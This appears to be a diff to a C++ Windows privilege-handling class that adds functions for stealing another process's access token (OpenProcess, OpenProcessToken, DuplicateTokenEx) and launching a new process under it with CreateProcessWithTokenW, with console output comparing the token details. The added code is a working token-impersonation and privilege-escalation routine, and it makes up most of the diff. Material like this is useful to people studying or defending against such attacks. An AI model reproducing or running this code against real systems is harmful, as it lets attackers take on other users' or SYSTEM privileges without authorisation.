@@ -5,6 +5,7 @@
 #include <stdexcept>
 #include <iostream>
 #include <tchar.h>
+#include <atlconv.h>
 #include "PTHandler.h"
 
 PTHandler::PTHandler() {
@@ -12,7 +13,7 @@ PTHandler::PTHandler() {
     this->processHandle =  GetCurrentProcess();
     HANDLE tokenH;
     if (!OpenProcessToken(this -> processHandle, TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &tokenH)) {
-        throw std::runtime_error("[*] - Couldn't open current process token\n");
+        std::cout << "[*] - Couldn't open current process token\n";
     }
     this -> tokenHandle = tokenH;
     DWORD tokenStatsSize = sizeof(this -> tokenStatistics);
@@ -34,7 +35,7 @@ TOKEN_STATISTICS PTHandler::getProcessInformation(HANDLE pHandle) {
                           TOKEN_QUERY,
                           &tokenH))
     {
-        throw std::runtime_error("[*] - Couldn't open current process token???\n");
+        std::cout << "[*] - Couldn't open current process token???\n";
     }
     TOKEN_STATISTICS tokenStatistics;
     DWORD tokenStatsSize = sizeof(tokenStatistics);
@@ -44,8 +45,8 @@ TOKEN_STATISTICS PTHandler::getProcessInformation(HANDLE pHandle) {
                              tokenStatsSize,
                              &tokenStatsSize))
     {
+        std::cout << "[*] - Couldn't get current process token statistics\n";
         CloseHandle(tokenH);
-        throw std::runtime_error("[*] - Couldn't get current process token statistics\n");
     }
     return tokenStatistics;
 }
@@ -263,6 +264,67 @@ BOOL PTHandler::isProcessAdmin(HANDLE hProcess) {
     }
     return elevationType == TokenElevationTypeFull;
 }
+
+/**
+ * @param processID
+ * @return TokenHandle for duplicated token if successful, nullptr otherwise
+ */
+HANDLE PTHandler::stealTokenFromProcess(DWORD processID) {
+    HANDLE stolenToken = nullptr;
+    SECURITY_IMPERSONATION_LEVEL impersonationLevel = SecurityImpersonation;
+    TOKEN_TYPE tokenType = TokenPrimary;
+    HANDLE hProcess;
+    HANDLE hToken;
+    hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, processID) ;
+    if (!hProcess) {
+        std::cout << "[*] - Couldn't open process, error: " << GetLastError() << std::endl;
+        return nullptr;
+    }
+    if (!OpenProcessToken(hProcess, TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY | TOKEN_QUERY, &hToken)) {
+        std::cout << "[*] - Couldn't open process token, error: " << GetLastError() << std::endl;
+        CloseHandle(hProcess);
+        return nullptr;
+    }
+    if (!DuplicateTokenEx(hToken, MAXIMUM_ALLOWED, nullptr, impersonationLevel, tokenType, &stolenToken)) {
+        std::cout << "[*] - Couldn't duplicate token, error: " << GetLastError() << std::endl;
+        CloseHandle(hToken);
+        CloseHandle(hProcess);
+        return nullptr;
+    }
+    CloseHandle(hToken);
+    CloseHandle(hProcess);
+    return stolenToken;
+}
+
+
+void PTHandler::createProcessWithToken(HANDLE stolenToken, const std::string &processPath) {
+    STARTUPINFOW si = {};
+    PROCESS_INFORMATION pi = {};
+
+    int size = MultiByteToWideChar(CP_UTF8, 0, processPath.c_str(), static_cast<int>(processPath.length()), nullptr, 0);
+    std::wstring ws(size, 0);
+    MultiByteToWideChar(CP_UTF8, 0, processPath.c_str(), static_cast<int>(processPath.length()), &ws[0], size);
+    LPWSTR lpApplicationName = const_cast<LPWSTR>(ws.c_str());
+    if(!CreateProcessWithTokenW(stolenToken, 0, lpApplicationName, nullptr, 0, nullptr, nullptr, &si, &pi)) {
+        std::cout << "[*] - Couldn't create process with stolen token, error: " << GetLastError() << std::endl;
+        CloseHandle(stolenToken);
+        return;
+    }
+    CloseHandle(stolenToken);
+    std::cout << "[*] - Process created successfully!" << std::endl;
+    std::cout << "[*] - Current process info : " << std::endl;
+    showTokenInfo(GetCurrentProcess());
+    std::cout << "[*] - Process with stolen token info : " << std::endl;
+    showTokenInfo(pi.hProcess);
+    CloseHandle(pi.hProcess);
+    CloseHandle(pi.hThread);
+
+}
+
+
+
+
+
 
 
 
